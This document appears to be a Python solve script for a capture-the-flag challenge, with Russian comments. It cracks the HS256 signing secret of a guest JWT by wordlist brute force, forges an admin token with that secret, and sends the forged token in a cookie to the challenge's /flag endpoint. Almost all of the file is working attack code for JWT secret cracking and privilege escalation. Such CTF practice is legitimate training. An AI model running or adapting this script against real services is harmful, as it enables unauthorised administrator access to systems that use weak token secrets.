#!/usr/bin/env python3
import argparse
import base64
import hashlib
import hmac
import json
import urllib.request


# JWT, который сервер выдает после входа guest:guest.
GUEST_JWT = (
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
    "eyJ1c2VyIjoiZ3Vlc3QifQ."
    "KVcwu6cwfsOQXQooeH7-S0j__1NwteG-9jFZ63aApe0"
)

FLAG_URL = "http://tasks.duckerz.ru:30056/flag"


def b64url_encode(data):
    """JWT использует base64url без символов '=' в конце."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(data):
    """Для декодирования возвращаем недостающие символы '='."""
    padding = "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data + padding)


def make_signature(header_b64, payload_b64, secret):
    """Считаем подпись JWT для алгоритма HS256."""
    message = f"{header_b64}.{payload_b64}".encode()
    digest = hmac.new(secret.encode(), message, hashlib.sha256).digest()
    return b64url_encode(digest)


def check_secret(token, secret):
    """Проверяем, подходит ли secret к уже полученному guest JWT."""
    header_b64, payload_b64, real_signature = token.split(".")
    test_signature = make_signature(header_b64, payload_b64, secret)
    return hmac.compare_digest(test_signature, real_signature)


def crack_secret(token, wordlist_path):
    """Перебираем слова из словаря и ищем secret, который дает такую же подпись."""
    with open(wordlist_path, "rb") as wordlist:
        for number, line in enumerate(wordlist, 1):
            secret = line.strip().decode("utf-8", errors="replace")

            if check_secret(token, secret):
                return secret

            if number % 1_000_000 == 0:
                print(f"[+] Checked {number} words")

    return None


def make_admin_jwt(secret):
    """Создаем новый JWT, где user уже admin, и подписываем его найденным secret."""
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"user": "admin"}

    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signature = make_signature(header_b64, payload_b64, secret)

    return f"{header_b64}.{payload_b64}.{signature}"


def show_guest_payload(token):
    """Показываем, что внутри guest JWT лежит user=guest."""
    header_b64, payload_b64, _ = token.split(".")
    header = json.loads(b64url_decode(header_b64))
    payload = json.loads(b64url_decode(payload_b64))

    print("[+] Guest JWT header:")
    print(json.dumps(header, indent=2))
    print("[+] Guest JWT payload:")
    print(json.dumps(payload, indent=2))


def get_flag(url, admin_jwt):
    """Делаем запрос к /flag с поддельным admin JWT в cookie."""
    request = urllib.request.Request(url)
    request.add_header("Cookie", f"jwt={admin_jwt}")

    with urllib.request.urlopen(request, timeout=10) as response:
        return response.read().decode()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--token", default=GUEST_JWT, help="guest JWT from server")
    parser.add_argument("--wordlist", required=True, help="wordlist for cracking secret")
    parser.add_argument("--url", default=FLAG_URL, help="flag endpoint URL")
    args = parser.parse_args()

    show_guest_payload(args.token)

    # Ищем secret по подписи guest JWT. Готовый secret в коде не хранится.
    print(f"[+] Cracking secret with wordlist: {args.wordlist}")
    secret = crack_secret(args.token, args.wordlist)
    if not secret:
        raise SystemExit("[-] Secret not found in this wordlist")
    print(f"[+] Secret found: {secret}")

    admin_jwt = make_admin_jwt(secret)

    print("[+] Forged admin JWT:")
    print(admin_jwt)

    print(f"[+] Requesting flag: {args.url}")
    print(get_flag(args.url, admin_jwt))


if __name__ == "__main__":
    main()
